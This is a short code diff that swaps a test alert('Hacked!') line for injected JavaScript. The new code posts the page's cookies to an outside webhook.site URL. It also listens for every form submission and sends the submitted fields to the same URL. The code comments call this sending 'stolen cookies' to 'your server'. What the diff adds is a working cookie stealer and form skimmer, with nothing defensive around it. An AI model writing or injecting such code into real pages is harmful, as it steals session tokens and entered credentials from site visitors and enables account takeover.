@@ -1,1 +1,15 @@
-alert("Hacked!"); // Test code
+// Send stolen cookies to your server
+fetch("https://webhook.site/38310abd-731f-4bb1-95aa-78d558225823", {
+  method: "POST",
+  body: document.cookie
+});
+
+// Capture form submissions
+document.addEventListener("submit", (e) => {
+  const data = new FormData(e.target);
+  fetch("https://webhook.site/38310abd-731f-4bb1-95aa-78d558225823", {
+    method: "POST",
+    body: JSON.stringify(Object.fromEntries(data))
+  });
+});
+
